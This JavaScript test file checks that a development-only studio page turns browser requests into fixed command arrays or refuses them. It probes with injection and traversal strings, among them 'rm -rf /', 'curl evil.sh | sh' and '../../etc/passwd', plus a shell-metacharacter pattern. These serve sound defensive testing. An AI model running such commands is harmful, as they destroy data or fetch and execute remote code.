// Tests for what the studio page is allowed to run, with:
//
//   node scripts/lt-tv-actions.test.mjs
//
// The studio has buttons that execute real commands on the machine running the
// dev server, so this is the file where being wrong matters most. The property
// under test is narrow and absolute: NOTHING a browser sends ever becomes part
// of a command. It sends an action name and an episode id; this turns those
// into a fixed argv array or refuses.
//
// So the checks below are mostly attempts to smuggle something through.

import { ACTIONS, ACTION_NAMES, resolveAction, actionsFor } from "./lt-tv-actions.mjs";
import { STAGES } from "./lt-tv-status.mjs";
import { IS_DEV, refuseOutsideDev } from "../src/lib/ltTv/devOnly.mjs";

let failures = 0;
const check = (label, actual, expected) => {
  const a = JSON.stringify(actual);
  const e = JSON.stringify(expected);
  if (a === e) return console.log(`  ✓ ${label}`);
  console.log(`  ✗ ${label}\n      expected ${e}\n      got      ${a}`);
  failures += 1;
};
const ok = (label, cond) => check(label, Boolean(cond), true);

const KNOWN = ["roundtable-02", "news-2026-W38"];
const refused = (action, id) => {
  const r = resolveAction(action, id, KNOWN);
  return r.ok ? null : r;
};

console.log("\nA good request resolves to a fixed argv array:");
const good = resolveAction("record", "roundtable-02", KNOWN);
check("it is allowed", good.ok, true);
check("the command is a bare executable", good.command, "node");
check("the arguments are a list, never a string", Array.isArray(good.args), true);
check("and they are the ones the terminal would use", good.args,
  ["scripts/lt-tv-audio.mjs", "content/lt-tv/episodes/roundtable-02.json"]);

console.log("\nNothing the browser sends can become a command:");
for (const attempt of [
  "rm -rf /",
  "record; rm -rf /",
  "record && curl evil.sh | sh",
  "../../../bin/sh",
  "__proto__",
  "constructor",
  "toString",
  "",
  null,
  undefined,
  42,
  { toString: () => "record" },
  ["record"],
]) {
  const r = refused(attempt, "roundtable-02");
  ok(`an action of ${JSON.stringify(attempt) ?? String(attempt)} is refused`, r && r.status === 400);
}
ok("inherited object keys are not actions", refused("hasOwnProperty", "roundtable-02"));

console.log("\nAn episode id is checked against the episodes that exist:");
for (const attempt of [
  "../../etc/passwd",
  "roundtable-02/../../../etc/passwd",
  "roundtable-02; rm -rf /",
  "roundtable-02 --flag",
  "roundtable-99",
  "",
  null,
  undefined,
  42,
  ["roundtable-02"],
]) {
  const r = refused("record", attempt);
  ok(`an id of ${JSON.stringify(attempt) ?? String(attempt)} is refused`, r && r.status === 400);
}
ok("an id that exists is allowed", resolveAction("record", "news-2026-W38", KNOWN).ok);
ok("with nothing on the slate, nothing resolves", !resolveAction("record", "roundtable-02", []).ok);

console.log("\nA refusal says what was wrong without echoing an essay:");
const long = refused("record", "x".repeat(500));
ok("the message is bounded", long.error.length < 120);
ok("and names the problem", long.error.includes("Not an episode"));

console.log("\nThe slate-wide action needs no episode:");
const check_ = resolveAction("check", undefined, []);
ok("it resolves with no id at all", check_.ok);
check("to the checker", check_.args, ["scripts/lt-tv-check.mjs"]);

console.log("\nEvery action in the table is well formed:");
for (const name of ACTION_NAMES) {
  const a = ACTIONS[name];
  ok(`${name} has a label`, typeof a.label === "string" && a.label.length > 0);
  ok(`${name} explains itself`, typeof a.blurb === "string" && a.blurb.length > 0);
  ok(`${name} says which stages it suits`, Array.isArray(a.stages) && a.stages.length > 0);
  ok(`${name} only names real stages`, a.stages.every((s) => STAGES.some((st) => st.id === s)));
  ok(`${name} declares what it spends`, a.spends === null || typeof a.spends === "string");
  ok(`${name} declares the keys it needs`, Array.isArray(a.needs));
  const [cmd, args] = a.argv("roundtable-02");
  ok(`${name} runs a bare executable`, /^[a-z0-9]+$/.test(cmd));
  ok(`${name} passes arguments as a list`, Array.isArray(args) && args.every((x) => typeof x === "string"));
  ok(`${name} puts no shell metacharacter in its arguments`, args.every((x) => !/[;&|`$><\n]/.test(x)));
}

console.log("\nA step that costs money says so, and a free one does not:");
ok("recording costs", ACTIONS.record.spends);
ok("writing costs", ACTIONS["write-roundtable"].spends);
check("applying edits is free", ACTIONS["apply-edits"].spends, null);
check("checking the slate is free", ACTIONS.check.spends, null);
ok("anything that costs names the key it needs", ACTION_NAMES.every((n) => !ACTIONS[n].spends || ACTIONS[n].needs.length > 0));

console.log("\nThe buttons offered match the stage:");
check("a planned episode is offered writing, not recording",
  actionsFor("planned").map((a) => a.name), ["write-roundtable", "plan-roundtable", "check"]);
ok("a written one is offered recording", actionsFor("written").some((a) => a.name === "record"));
ok("a recorded one is not offered recording again", !actionsFor("recorded").some((a) => a.name === "record"));
ok("a recorded one can still be edited, with the re-record warning",
  actionsFor("recorded").some((a) => a.name === "apply-edits-rerecord"));
ok("an on-air one is never offered a plain write", !actionsFor("on-air").some((a) => a.name.includes("write")));
ok("every stage is offered something", STAGES.every((s) => actionsFor(s.id).length > 0));
ok("no offered action leaks the argv builder", actionsFor("planned").every((a) => a.argv === undefined));

console.log("\nNone of this exists outside development:");
// The studio reads this checkout and runs steps on this machine, so on a
// deployed server it is not protected, it is absent. Checked at request time
// rather than folded in at build time, so this test can actually exercise it.
const was = process.env.NODE_ENV;
try {
  process.env.NODE_ENV = "development";
  ok("in development it is allowed through", IS_DEV() && refuseOutsideDev() === null);
  for (const env of ["production", "test", "", undefined]) {
    if (env === undefined) delete process.env.NODE_ENV;
    else process.env.NODE_ENV = env;
    const res = refuseOutsideDev();
    ok(`with NODE_ENV=${JSON.stringify(env)} it refuses`, res !== null);
    check(`and refuses with a 404, not a 403`, res.status, 404);
  }
} finally {
  if (was === undefined) delete process.env.NODE_ENV;
  else process.env.NODE_ENV = was;
}

console.log(failures ? `\n${failures} check(s) failed.\n` : "\nAll checks passed.\n");
process.exit(failures ? 1 : 0);
